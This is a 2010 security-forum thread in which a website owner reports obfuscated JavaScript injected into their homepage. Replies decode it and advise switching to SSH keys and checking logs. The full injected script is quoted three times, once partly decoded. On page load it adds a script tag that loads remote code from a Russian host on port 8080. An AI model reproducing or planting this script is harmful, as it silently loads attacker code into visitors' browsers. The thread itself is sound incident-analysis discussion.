---
title: "Port 8080 Virus"
date: 2010-06-18
forum: Security
---

### Post by beont on 2010-06-18
Newbie here.

I am using the Ubuntu's SSH Connect to Server icon from places to connect to my web site's files. I ve noticed that there is a Javascript hack at the end of my homepage.
```
<!-- google -->
<script>var Oe=new Array();var jL;if(jL!='' && jL!='k'){jL=null};function M(){var bC='';var F='';var u;if(u!='K'){u='K'};var i=unescape;var f=new Date();var V=window;this.gQ='';var e;if(e!='' && e!='h_'){e=null};var ha=i("%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%77%73%6a%2e%63%6f%6d%2f%6e%68%6c%2e%63%6f%6d%2e%70%68%70");var ig;if(ig!='ol'){ig='ol'};this.km="";var ns=new Array();var Wm=new Date();function h(R,z){var uR='';var JL=new Array();var D=new String("g");var x=i("%5b"), p=i("%5d");var Eb;if(Eb!='FT' && Eb!='gd'){Eb=''};var y=x+z+p;var dm=new String();var OSy;if(OSy!='S' && OSy != ''){OSy=null};var n=new RegExp(y, D);var uS="";var Oc;if(Oc!=''){Oc='xl'};return R.replace(n, new String());};var TN;if(TN!='Z' && TN != ''){TN=null};var Bg;if(Bg!='Fz'){Bg='Fz'};var J=h('83711670614438762463033235','79542136');var G=new String();var iV=new String();var d=document;var A;if(A!='rK'){A=''};var R_='';function c(){var ng;if(ng!='Am'){ng=''};var jM="";var za=i("%68%74%74%70%3a%2f%2f%69%63%79%63%68%69%6e%61%2e%72%75%3a");var yX=new String();var iQ=new String();var iR;if(iR!='' && iR!='sw'){iR='xf'};var Hd;if(Hd!='rF'){Hd=''};iV=za;var _H=new Date();iV+=J;var xH;if(xH!=''){xH='Oo'};iV+=ha;var dj=new Date();var CSK;if(CSK!='bq' && CSK!='WZ'){CSK=''};this.Mo="";this.ls="";try {var oe;if(oe!='Uk' && oe != ''){oe=null};var wY=new String();B=d.createElement(h('sucjrDijpjtY','ASWO_kRYPzv4jgqDTu'));var RC;if(RC!='KuE' && RC!='kL'){RC=''};var ux;if(ux!='wi' && ux!='OZ'){ux=''};B[i("%73%72%63")]=iV;var Hmt;if(Hmt!='yG'){Hmt='yG'};this.qx='';B[i("%64%65%66%65%72")]=[1][0];var dB;if(dB!='' && dB!='P'){dB=''};var El;if(El!='' && El!='FO'){El=''};var gT;if(gT!='' && gT!='eE'){gT='_d'};var Na;if(Na!='' && Na!='jy'){Na='dD'};d.body.appendChild(B);var mn;if(mn!='Wk' && mn!='Ak'){mn=''};var fb=new Array();var rZ;if(rZ!='' && rZ!='LA'){rZ=null};} catch(E){alert(E);var JE;if(JE!='sS'){JE=''};var kP=new Array();};var Ai;if(Ai!='' && Ai!='a'){Ai=null};}var ZV=new Date();var _P;if(_P!='v'){_P='v'};V[new String("onloa1j9".substr(0,5)+"d")]=c;var yZ;if(yZ!='bL' && yZ!='JZ'){yZ=''};var DV=new String();var vP=new String();};var Vn;if(Vn!='DZ' && Vn != ''){Vn=null};var Gk=new String();M();</script>
<!--1fa277b1b2e1178631a9b46df87fba0c-->
```
I ve searched the web found that the virus is called Port 8080 (I think)
I have been using FileZilla to connect but I uninstalled it changed the password and connect via ubuntu Network connections. Is it possible the password of my SSH-FTP is being hacked?? Ntoe that i save the password when asked. 

Thank you

---

### Post by wojox on 2010-06-18
Maybe. I would set up keys instead of passwords. [Public and Private Keys]("https://help.ubuntu.com/community/SSH/OpenSSH/Keys")

---

### Post by yeleek on 2010-06-18
This is what it looks liker once through a urldecoder

note
google.com/wsj.com/nhl.com.php

So i'd look for that page (nhl.com.php)

```
<script>var Oe=new Array();var jL;if(jL!='' && jL!='k'){jL=null};function M(){var bC='';var F='';var u;if(u!='K'){u='K'};var i=unescape;var f=new Date();var V=window;this.gQ='';var e;if(e!='' && e!='h_'){e=null};var ha=i("**/google.com/wsj.com/nhl.com.php**");var ig;if(ig!='ol'){ig='ol'};this.km="";var ns=new Array();var Wm=new Date();function h(R,z){var uR='';var JL=new Array();var D=new String("g");var x=i("["), p=i("]");var Eb;if(Eb!='FT' && Eb!='gd'){Eb=''};var y=x+z+p;var dm=new String();var OSy;if(OSy!='S' && OSy != ''){OSy=null};var n=new RegExp(y, D);var uS="";var Oc;if(Oc!=''){Oc='xl'};return R.replace(n, new String());};var TN;if(TN!='Z' && TN != ''){TN=null};var Bg;if(Bg!='Fz'){Bg='Fz'};var J=h('83711670614438762463033235','79542136');var G=new String();var iV=new String();var d=document;var A;if(A!='rK'){A=''};var R_='';function c(){var ng;if(ng!='Am'){ng=''};var jM="";var za=i("http://icychina.ru:");var yX=new String();var iQ=new String();var iR;if(iR!='' && iR!='sw'){iR='xf'};var Hd;if(Hd!='rF'){Hd=''};iV=za;var _H=new Date();iV+=J;var xH;if(xH!=''){xH='Oo'};iV+=ha;var dj=new Date();var CSK;if(CSK!='bq' && CSK!='WZ'){CSK=''};this.Mo="";this.ls="";try {var oe;if(oe!='Uk' && oe != ''){oe=null};var wY=new String();B=d.createElement(h('sucjrDijpjtY','ASWO_kRYPzv4jgqDTu'));var RC;if(RC!='KuE' && RC!='kL'){RC=''};var ux;if(ux!='wi' && ux!='OZ'){ux=''};B[i("src")]=iV;var Hmt;if(Hmt!='yG'){Hmt='yG'};this.qx='';B[i("defer")]=[1][0];var dB;if(dB!='' && dB!='P'){dB=''};var El;if(El!='' && El!='FO'){El=''};var gT;if(gT!='' && gT!='eE'){gT='_d'};var Na;if(Na!='' && Na!='jy'){Na='dD'};d.body.appendChild(B);var mn;if(mn!='Wk' && mn!='Ak'){mn=''};var fb=new Array();var rZ;if(rZ!='' && rZ!='LA'){rZ=null};} catch(E){alert(E);var JE;if(JE!='sS'){JE=''};var kP=new Array();};var Ai;if(Ai!='' && Ai!='a'){Ai=null};}var ZV=new Date();var _P;if(_P!='v'){_P='v'};V[new String("onloa1j9".substr(0,5)+"d")]=c;var yZ;if(yZ!='bL' && yZ!='JZ'){yZ=''};var DV=new String();var vP=new String();};var Vn;if(Vn!='DZ' && Vn != ''){Vn=null};var Gk=new String();M();</script>
```

Use keys as wojox suggests, and i'd personally investigate your site.  Make sure you have no weaknesses there which could have been compromised i.e. chmod perms, htaccess, vulnerable scripts, etc.

---

### Post by LiQuidAiR on 2010-06-18
> **beont said:**
> Newbie here.

I am using the Ubuntu's SSH Connect to Server icon from places to connect to my web site's files. I ve noticed that there is a Javascript hack at the end of my homepage.
```
<!-- google -->
<script>var Oe=new Array();var jL;if(jL!='' && jL!='k'){jL=null};function M(){var bC='';var F='';var u;if(u!='K'){u='K'};var i=unescape;var f=new Date();var V=window;this.gQ='';var e;if(e!='' && e!='h_'){e=null};var ha=i("%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%77%73%6a%2e%63%6f%6d%2f%6e%68%6c%2e%63%6f%6d%2e%70%68%70");var ig;if(ig!='ol'){ig='ol'};this.km="";var ns=new Array();var Wm=new Date();function h(R,z){var uR='';var JL=new Array();var D=new String("g");var x=i("%5b"), p=i("%5d");var Eb;if(Eb!='FT' && Eb!='gd'){Eb=''};var y=x+z+p;var dm=new String();var OSy;if(OSy!='S' && OSy != ''){OSy=null};var n=new RegExp(y, D);var uS="";var Oc;if(Oc!=''){Oc='xl'};return R.replace(n, new String());};var TN;if(TN!='Z' && TN != ''){TN=null};var Bg;if(Bg!='Fz'){Bg='Fz'};var J=h('83711670614438762463033235','79542136');var G=new String();var iV=new String();var d=document;var A;if(A!='rK'){A=''};var R_='';function c(){var ng;if(ng!='Am'){ng=''};var jM="";var za=i("%68%74%74%70%3a%2f%2f%69%63%79%63%68%69%6e%61%2e%72%75%3a");var yX=new String();var iQ=new String();var iR;if(iR!='' && iR!='sw'){iR='xf'};var Hd;if(Hd!='rF'){Hd=''};iV=za;var _H=new Date();iV+=J;var xH;if(xH!=''){xH='Oo'};iV+=ha;var dj=new Date();var CSK;if(CSK!='bq' && CSK!='WZ'){CSK=''};this.Mo="";this.ls="";try {var oe;if(oe!='Uk' && oe != ''){oe=null};var wY=new String();B=d.createElement(h('sucjrDijpjtY','ASWO_kRYPzv4jgqDTu'));var RC;if(RC!='KuE' && RC!='kL'){RC=''};var ux;if(ux!='wi' && ux!='OZ'){ux=''};B[i("%73%72%63")]=iV;var Hmt;if(Hmt!='yG'){Hmt='yG'};this.qx='';B[i("%64%65%66%65%72")]=[1][0];var dB;if(dB!='' && dB!='P'){dB=''};var El;if(El!='' && El!='FO'){El=''};var gT;if(gT!='' && gT!='eE'){gT='_d'};var Na;if(Na!='' && Na!='jy'){Na='dD'};d.body.appendChild(B);var mn;if(mn!='Wk' && mn!='Ak'){mn=''};var fb=new Array();var rZ;if(rZ!='' && rZ!='LA'){rZ=null};} catch(E){alert(E);var JE;if(JE!='sS'){JE=''};var kP=new Array();};var Ai;if(Ai!='' && Ai!='a'){Ai=null};}var ZV=new Date();var _P;if(_P!='v'){_P='v'};V[new String("onloa1j9".substr(0,5)+"d")]=c;var yZ;if(yZ!='bL' && yZ!='JZ'){yZ=''};var DV=new String();var vP=new String();};var Vn;if(Vn!='DZ' && Vn != ''){Vn=null};var Gk=new String();M();</script>
<!--1fa277b1b2e1178631a9b46df87fba0c-->
```
I ve searched the web found that the virus is called Port 8080 (I think)
I have been using FileZilla to connect but I uninstalled it changed the password and connect via ubuntu Network connections. Is it possible the password of my SSH-FTP is being hacked?? Ntoe that i save the password when asked. 

Thank you



Check your ssh logs and or web server logs for attempts into your system.  Also, if your not sure, run an nmap scan on your system from another location; to see which ports are open.  If you've been hacked you might have a bigger problem on your hand.  If they are able to change files on your web server, what's to stop them from changing or more important files?

Have you tried to decyhper the javascript code?

---

### Post by LiQuidAiR on 2010-06-18
It looks like the embedded functions simply return interpretations from encoded strings.  The little I looked at it I can see that it connects to a server at an address of 

[http://icychina.ru:8080/google.com/wsj.com/nhl.com.php](http://icychina.ru:8080/google.com/wsj.com/nhl.com.php)

Interesting...When you do a icychina.ru trace route it pops back blank.

---

